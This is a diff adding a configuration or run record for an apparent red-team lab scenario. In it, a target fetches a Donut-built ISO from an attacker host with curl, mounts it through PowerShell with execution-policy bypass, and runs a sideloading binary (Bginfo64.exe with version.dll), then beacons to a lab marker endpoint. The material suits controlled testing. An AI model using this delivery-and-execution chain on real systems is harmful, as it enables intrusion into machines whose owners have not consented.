@@ -1,0 +1,15 @@
+scenario=run-a
+delivery_bind=192.168.1.50:18080
+delivery_object=donut-delivery.iso
+marker_bind=192.168.1.50:18081
+marker_expected_path=/lab-marker
+target=192.168.1.52
+allowed_network=192.168.1.0/24
+donut_options=-a 2 -b 1 -e 1 -z 1
+planted_images=Bginfo64.exe,version.dll,riched32.dat
+injection_hosts=none
+target_delivery=curl.exe http://192.168.1.50:18080/donut-delivery.iso
+target_mount=powershell.exe -ex bypass -command Mount-DiskImage -ImagePath (gc C:\Windows\path.txt)
+target_execute=<mounted-volume>\RunA\Bginfo64.exe
+delivery_result=GET 200
+marker_result=POST /lab-marker 204
